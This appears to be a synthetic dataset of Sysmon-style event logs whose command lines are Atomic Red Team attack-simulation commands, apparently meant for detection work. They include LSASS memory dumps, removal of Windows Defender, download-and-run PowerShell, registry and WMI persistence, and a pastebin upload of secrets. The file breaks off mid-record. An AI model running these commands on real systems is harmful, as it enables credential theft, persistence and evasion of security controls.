    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-79.dickson-rose.com",
        "User": "mcneilrobert",
        "ProcessID": 9486,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"net user \\\"#{username}\\\" \\\"#{password}\\\" /add /domain\\n\",",
        "LogonID": 109186,
        "LogonGuid": "f3f2fc7b-298e-42e8-add1-58fd8cbc68b1",
        "SourceProcessID": 6471,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\claim..exe",
        "DestinationProcessID": 5369,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\vote..exe",
        "UtcTime": "2024-05-17T01:36:51.642038Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-59.hudson.net",
        "User": "jacqueline13",
        "ProcessID": 2776,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$RunOnceKey = \\\"#{reg_key_path}\\\"\\nset-itemproperty $RunOnceKey \\\"NextRun\\\" '#{thing_to_execute} \\\"IEX (New-Object Net.WebClient).DownloadString(`\\\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\\\")\\\"'\\n\",",
        "LogonID": 732927,
        "LogonGuid": "c64ff28a-bb57-4e38-aea7-e0d1d16c2d52",
        "SourceProcessID": 1560,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\standard..dll",
        "DestinationProcessID": 4921,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\approach..dll",
        "UtcTime": "2024-05-17T01:36:51.642038Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-90.swanson.com",
        "User": "robertmerritt",
        "ProcessID": 8827,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}\\n\",",
        "LogonID": 223067,
        "LogonGuid": "d2cbe28a-7686-4b02-af46-c3da72823838",
        "SourceProcessID": 8667,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\establish..exe",
        "DestinationProcessID": 4505,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\maybe..dll",
        "UtcTime": "2024-05-17T01:36:51.643547Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-95.wilson.info",
        "User": "jenniferbarnes",
        "ProcessID": 4184,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$secure_pwd = \\\"#{password}\\\" | ConvertTo-SecureString -AsPlainText -Force\\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $secure_pwd\\nConnect-AzureAD -Credential $creds\\nRemove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}\\n\",",
        "LogonID": 328436,
        "LogonGuid": "f616986f-0487-4251-af9b-cc11476fc487",
        "SourceProcessID": 4738,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\check..exe",
        "DestinationProcessID": 5363,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\ok..exe",
        "UtcTime": "2024-05-17T01:36:51.643547Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-97.diaz.com",
        "User": "melindabowman",
        "ProcessID": 8392,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\batstartup.bat\\\" \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\batstartup.bat\\\"\\nCopy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\batstartup.bat\\\" \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\batstartup.bat\\\"\\nStart-Process \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\batstartup.bat\\\"\\nStart-Process \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\batstartup.bat\\\"\\n\",",
        "LogonID": 434187,
        "LogonGuid": "0b2c7853-c036-450b-946e-7a4b93fec77a",
        "SourceProcessID": 8692,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\as..exe",
        "DestinationProcessID": 3400,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\stock..exe",
        "UtcTime": "2024-05-17T01:36:51.643547Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-38.huffman.com",
        "User": "elizabethtanner",
        "ProcessID": 3110,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Copy-Item \\\"#{dll_path}\\\" C:\\\\Users\\\\Public\\\\AtomicTest.dll -Force\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCertDlls\\\" /v \\\"AtomicTest\\\" /t REG_EXPAND_SZ /d \\\"C:\\\\Users\\\\Public\\\\AtomicTest.dll\\\" /f\\nif(#{reboot}){Restart-Computer} \\n\",",
        "LogonID": 252072,
        "LogonGuid": "45952f6c-a622-4de0-a406-2fc04e603b17",
        "SourceProcessID": 5636,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\pretty..exe",
        "DestinationProcessID": 4119,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\country..exe",
        "UtcTime": "2024-05-17T01:36:51.644557Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-32.ryan.com",
        "User": "bautistaheather",
        "ProcessID": 3878,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"# Encoded payload in next command is the following \\\"Set-Content -path \\\"$env:SystemRoot/Temp/art-marker.txt\\\" -value \\\"Hello from the Atomic Red Team\\\"\\\"\\nreg.exe add \\\"HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\AtomicRedTeam\\\" /v ART /t REG_SZ /d \\\"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\\\" /f\\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\\\Software\\\\Classes\\\\AtomicRedTeam').ART)))\\n\",",
        "LogonID": 957000,
        "LogonGuid": "e2dd4c7f-45d3-4aa6-bcc1-72c0cb73e5f5",
        "SourceProcessID": 3356,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\road..dll",
        "DestinationProcessID": 6947,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\expert..exe",
        "UtcTime": "2024-05-17T01:36:51.645064Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-66.hansen.biz",
        "User": "matthew52",
        "ProcessID": 1242,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sc config Fax binPath= \\\"C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noexit -c \\\\\\\"write-host 'T1543.003 Test'\\\\\\\"\\\"\\nsc start Fax\\n\",",
        "LogonID": 703008,
        "LogonGuid": "8454c352-fab1-45e0-8248-d21deb43498f",
        "SourceProcessID": 5901,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\above..dll",
        "DestinationProcessID": 8573,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\candidate..dll",
        "UtcTime": "2024-05-17T01:36:51.645064Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-97.kelley.info",
        "User": "jackesparza",
        "ProcessID": 2695,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Import-Module AADInternals -Force\\nExport-AADIntADFSCertificates\\nGet-ChildItem | Where-Object {$_ -like \\\"ADFS*\\\"}\\nWrite-Host \\\"`nCertificates retrieved successfully\\\"\\n\",",
        "LogonID": 162666,
        "LogonGuid": "308b067e-4b70-4ff4-877a-1257e8a7211b",
        "SourceProcessID": 1814,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\young..exe",
        "DestinationProcessID": 1038,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\floor..exe",
        "UtcTime": "2024-05-17T01:36:51.645064Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-73.butler.com",
        "User": "brianpotts",
        "ProcessID": 7178,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"ssh #{domain} \\\"(cd /etc && tar -zcvf - *)\\\" > ./etc.tar.gz\\n\",",
        "LogonID": 959239,
        "LogonGuid": "dbf08e00-d4b7-4570-971f-952f75933cc7",
        "SourceProcessID": 2320,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\family..dll",
        "DestinationProcessID": 9498,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\message..exe",
        "UtcTime": "2024-05-17T01:36:51.645064Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-41.sandoval-fuller.com",
        "User": "arnoldwilliam",
        "ProcessID": 4009,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$ports = Get-content \\\"#{port_file}\\\"\\n$file = \\\"#{output_file}\\\"\\n$totalopen = 0\\n$totalports = 0\\nNew-Item $file -Force\\nforeach ($port in $ports) {\\n    $test = new-object system.Net.Sockets.TcpClient\\n    $wait = $test.beginConnect(\\\"allports.exposed\\\", $port, $null, $null)\\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\\n    $totalports++ | Out-Null\\n    if ($test.Connected) {\\n        $result = \\\"$port open\\\" \\n        Write-Host -ForegroundColor Green $result\\n        $result | Out-File -Encoding ASCII -append $file\\n        $totalopen++ | Out-Null\\n    }\\n    else {\\n        $result = \\\"$port closed\\\" \\n        Write-Host -ForegroundColor Red $result\\n        $totalclosed++ | Out-Null\\n        $result | Out-File -Encoding ASCII -append $file\\n    }\\n}\\n$results = \\\"There were a total of $totalopen open ports out of $totalports ports tested.\\\"\\n$results | Out-File -Encoding ASCII -append $file\\nWrite-Host $results\\n\",",
        "LogonID": 901771,
        "LogonGuid": "f9315321-2df2-48fc-9777-ba64f237d126",
        "SourceProcessID": 9250,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\century..exe",
        "DestinationProcessID": 5070,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\several..exe",
        "UtcTime": "2024-05-17T01:36:51.646072Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-87.russell-murray.com",
        "User": "andrew33",
        "ProcessID": 9093,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"attrib.exe +s #{file_to_modify}\\n\",",
        "LogonID": 427553,
        "LogonGuid": "9c74d615-4851-4f92-a8d3-f1a6bdd6bde8",
        "SourceProcessID": 8005,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\house..dll",
        "DestinationProcessID": 6357,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\reveal..dll",
        "UtcTime": "2024-05-17T01:36:51.646072Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-03.johnson.com",
        "User": "taylorjoseph",
        "ProcessID": 8802,
        "ProcessName": "malware.exe",
        "CommandLine": "\"([adsisearcher]\\\"objectcategory=group\\\").FindAll(); ([adsisearcher]\\\"objectcategory=group\\\").FindOne()\\n\",",
        "LogonID": 662219,
        "LogonGuid": "825210c1-1618-4770-bf97-b269d460d717",
        "SourceProcessID": 6525,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\learn..exe",
        "DestinationProcessID": 4351,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\remain..exe",
        "UtcTime": "2024-05-17T01:36:51.646072Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-94.johnson.com",
        "User": "westtheodore",
        "ProcessID": 9125,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\\n\",",
        "LogonID": 701078,
        "LogonGuid": "3c646f58-0420-4215-9c13-4bfa9aa49411",
        "SourceProcessID": 6875,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\red..dll",
        "DestinationProcessID": 9166,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\challenge..exe",
        "UtcTime": "2024-05-17T01:36:51.646072Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-70.bush-chandler.com",
        "User": "adriana58",
        "ProcessID": 2667,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"TEST=$(echo $HISTFILESIZE)\\necho $HISTFILESIZE\\nexport HISTFILESIZE=0\\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \\\"\\\\$HISTFILESIZE is zero\\\"; fi\\n# -> $HISTFILESIZE is zero\\n\",",
        "LogonID": 990015,
        "LogonGuid": "6b20a6eb-232d-4410-860c-970b2226e212",
        "SourceProcessID": 4874,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\let..dll",
        "DestinationProcessID": 3829,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\know..dll",
        "UtcTime": "2024-05-17T01:36:51.646072Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-34.smith.com",
        "User": "monica77",
        "ProcessID": 7077,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\" /v DontShowUI /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 477868,
        "LogonGuid": "8bd91656-f91a-45fe-9155-3736291d9bdd",
        "SourceProcessID": 8398,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\big..dll",
        "DestinationProcessID": 8701,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\market..exe",
        "UtcTime": "2024-05-17T01:36:51.647074Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-27.hodges.com",
        "User": "wmorris",
        "ProcessID": 7226,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"C:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\\\lsass-comsvcs.dmp full\\n\",",
        "LogonID": 378907,
        "LogonGuid": "479d5908-3336-4706-a3da-2bac1388da1a",
        "SourceProcessID": 6200,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\mind..exe",
        "DestinationProcessID": 3233,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\order..dll",
        "UtcTime": "2024-05-17T01:36:51.647074Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-78.davis-stevens.com",
        "User": "xboyle",
        "ProcessID": 3279,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Get-ItemProperty HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\\nGet-ItemProperty HKLM:\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\\n\",",
        "LogonID": 524681,
        "LogonGuid": "711a09da-a25d-4369-ae68-afd10770d227",
        "SourceProcessID": 2494,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\hold..dll",
        "DestinationProcessID": 4090,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\need..exe",
        "UtcTime": "2024-05-17T01:36:51.647074Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-22.barton-johnson.org",
        "User": "jensenjody",
        "ProcessID": 9127,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\\n                EventNameSpace='root\\\\CimV2';\\n                QueryLanguage=\\\"WQL\\\";\\n                Query=\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\\\"};\\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \\\"root\\\\subscription\\\" -Arguments $FilterArgs\\n\\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\\n                ScriptingEngine='VBScript';\\n                ScriptText='\\n                Set objws = CreateObject(\\\"Wscript.Shell\\\")\\n                objws.Run \\\"notepad.exe\\\", 0, True\\n                '}\\n$Consumer=Set-WmiInstance -Namespace \\\"root\\\\subscription\\\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\\n\\n$FilterToConsumerArgs = @{\\nFilter = $Filter;\\nConsumer = $Consumer;\\n}\\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs\\n\",",
        "LogonID": 572831,
        "LogonGuid": "dd200b39-2178-4d90-a167-edcaf16e6283",
        "SourceProcessID": 7089,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\prevent..dll",
        "DestinationProcessID": 8593,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\since..exe",
        "UtcTime": "2024-05-17T01:36:51.647074Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-58.norris.net",
        "User": "crystalhardy",
        "ProcessID": 5370,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"touch #{file_to_setuid}\\nchown root #{file_to_setuid}\\nchmod u+xs #{file_to_setuid}\\n\",",
        "LogonID": 108441,
        "LogonGuid": "db1b417d-4b5e-4f7b-967d-1e2a6651ad9c",
        "SourceProcessID": 9417,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\at..exe",
        "DestinationProcessID": 5440,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\you..dll",
        "UtcTime": "2024-05-17T01:36:51.648071Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-09.phillips.com",
        "User": "andrew31",
        "ProcessID": 1297,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"del %TEMP%\\\\redcanary.cab >nul 2>&1\\n#{Path_replace} #{replace_cab} %TEMP% /A\\n\",",
        "LogonID": 872529,
        "LogonGuid": "a75e681b-91d6-4326-a195-9df215a56202",
        "SourceProcessID": 6465,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\more..dll",
        "DestinationProcessID": 7461,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\arm..exe",
        "UtcTime": "2024-05-17T01:36:51.648071Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-45.wheeler.info",
        "User": "gmccarthy",
        "ProcessID": 3791,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet\\n\",",
        "LogonID": 827705,
        "LogonGuid": "5b649314-b044-4454-85ae-322daeebe8da",
        "SourceProcessID": 5455,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\own..exe",
        "DestinationProcessID": 5251,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\start..exe",
        "UtcTime": "2024-05-17T01:36:51.648071Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-62.dickerson.org",
        "User": "kari41",
        "ProcessID": 3687,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"REG ADD \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\#{target_binary}\\\" /v GlobalFlag /t REG_DWORD /d 512\\nREG ADD \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\#{target_binary}\\\" /v ReportingMode /t REG_DWORD /d 1\\nREG ADD \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\#{target_binary}\\\" /v MonitorProcess /d \\\"#{payload_binary}\\\"\\n\",",
        "LogonID": 951240,
        "LogonGuid": "583cf531-2f6f-4bd8-bc0f-2fded5a2f835",
        "SourceProcessID": 5402,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\relate..dll",
        "DestinationProcessID": 4997,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\population..exe",
        "UtcTime": "2024-05-17T01:36:51.648071Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-30.andrade-meyers.com",
        "User": "david69",
        "ProcessID": 4546,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"schtasks.exe /Change /TN \\\"\\\\Microsoft\\\\Windows\\\\SystemRestore\\\\SR\\\" /disable\\n\",",
        "LogonID": 872176,
        "LogonGuid": "6f5a6bf0-0322-4d71-ad99-3eb90dfa568c",
        "SourceProcessID": 6703,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\anything..dll",
        "DestinationProcessID": 8697,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\them..dll",
        "UtcTime": "2024-05-17T01:36:51.648071Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-19.hill-morales.com",
        "User": "thompsontracy",
        "ProcessID": 3671,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$exePath =  resolve-path \\\"$env:ProgramFiles\\\\dotnet\\\\shared\\\\Microsoft.NETCore.App\\\\5*\\\\createdump.exe\\\"\\n& \\\"$exePath\\\" -u -f $env:Temp\\\\dotnet-lsass.dmp (Get-Process lsass).id\\n\",",
        "LogonID": 804577,
        "LogonGuid": "5aac8412-be57-406a-bcb6-9353e125217f",
        "SourceProcessID": 5909,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\despite..exe",
        "DestinationProcessID": 4877,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\may..dll",
        "UtcTime": "2024-05-17T01:36:51.648071Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-24.garcia.info",
        "User": "ksingh",
        "ProcessID": 2787,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"cd \\\"#{rsp_file_path}\\\"\\nodbcconf.exe -f \\\"#{rsp_file_name}\\\"\\n\",",
        "LogonID": 120189,
        "LogonGuid": "29a3daee-2c1f-4a24-a479-9e1844e3522d",
        "SourceProcessID": 9399,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\room..dll",
        "DestinationProcessID": 8283,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\lot..exe",
        "UtcTime": "2024-05-17T01:36:51.649069Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-94.aguirre.com",
        "User": "carloshernandez",
        "ProcessID": 7579,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$apiKey = \\\"#{api_key}\\\"\\n$content = \\\"secrets, api keys, passwords...\\\"\\n$url = \\\"https://pastebin.com/api/api_post.php\\\"\\n$postData = @{\\n  api_dev_key   = $apiKey\\n  api_option    = \\\"paste\\\"\\n  api_paste_code = $content\\n}\\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\\nWrite-Host \\\"Your paste URL: $response\\\"\\n\",",
        "LogonID": 779380,
        "LogonGuid": "721e2302-a5d6-4747-9dc5-974593029bce",
        "SourceProcessID": 4742,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\writer..dll",
        "DestinationProcessID": 4287,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\little..exe",
        "UtcTime": "2024-05-17T01:36:51.649069Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-42.wright.org",
        "User": "ronaldwelch",
        "ProcessID": 4223,
        "ProcessName": "nc.exe",
        "CommandLine": "\"for i in $(seq 1 5); do echo \\\"$i, Atomic Red Team was here!\\\"; sleep 1; done\\n\",",
        "LogonID": 995759,
        "LogonGuid": "f7a6601c-b7e6-4828-8dbc-04b1c7afc7d4",
        "SourceProcessID": 7325,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\because..dll",
        "DestinationProcessID": 5032,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\spend..exe",
        "UtcTime": "2024-05-17T01:36:51.649069Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-70.newman.com",
        "User": "tiffanyalvarado",
        "ProcessID": 3725,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"#{flavor_command}\\n\",",
        "LogonID": 970005,
        "LogonGuid": "8acf4dbd-b82e-41d8-89cc-93f2f31a68a3",
        "SourceProcessID": 1577,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\people..dll",
        "DestinationProcessID": 1984,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\return..dll",
        "UtcTime": "2024-05-17T01:36:51.649069Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-49.reed-dennis.com",
        "User": "vrusso",
        "ProcessID": 9997,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$localip = ((ipconfig | findstr [0-9].\\\\.)[0]).Split()[-1]\\n$pieces = $localip.split(\\\".\\\")\\n$firstOctet = $pieces[0]\\n$secondOctet = $pieces[1]\\n$thirdOctet = $pieces[2]\\nforeach ($ip in 1..255 | % { \\\"$firstOctet.$secondOctet.$thirdOctet.$_\\\" } ) {cmd.exe /c nslookup $ip}\\n\",",
        "LogonID": 404935,
        "LogonGuid": "8124dc89-7cf0-4ee9-9bbe-e48f87ec0f64",
        "SourceProcessID": 7577,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\wish..dll",
        "DestinationProcessID": 2272,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\far..dll",
        "UtcTime": "2024-05-17T01:36:51.649069Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-70.hardy.biz",
        "User": "robert80",
        "ProcessID": 5692,
        "ProcessName": "malware.exe",
        "CommandLine": "\"cd $HOME\\ncurl -O #{remote_url}/art\\ncurl -O #{remote_url}/gta.db\\ncurl -O #{remote_url}/sqlite_dump.sh\\nchmod +x sqlite_dump.sh\\nfind . ! -executable -exec bash -c 'if [[ \\\"$(head -c 15 {} | strings)\\\" == \\\"SQLite format 3\\\" ]]; then echo \\\"{}\\\"; ./sqlite_dump.sh {}; fi' \\\\;\\n\",",
        "LogonID": 680817,
        "LogonGuid": "d6ee3a23-d422-47f8-b076-fd83fbfb7696",
        "SourceProcessID": 4681,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\coach..exe",
        "DestinationProcessID": 8436,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\production..dll",
        "UtcTime": "2024-05-17T01:36:51.650074Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-67.hardin.info",
        "User": "cindy87",
        "ProcessID": 6333,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet\",",
        "LogonID": 227172,
        "LogonGuid": "212ae20d-7be1-4ccf-ad2f-3af8cb90d613",
        "SourceProcessID": 4170,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\individual..dll",
        "DestinationProcessID": 7079,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\PM..dll",
        "UtcTime": "2024-05-17T01:36:51.650074Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-31.richard-hanna.com",
        "User": "michelle33",
        "ProcessID": 6093,
        "ProcessName": "backdoor.exe",
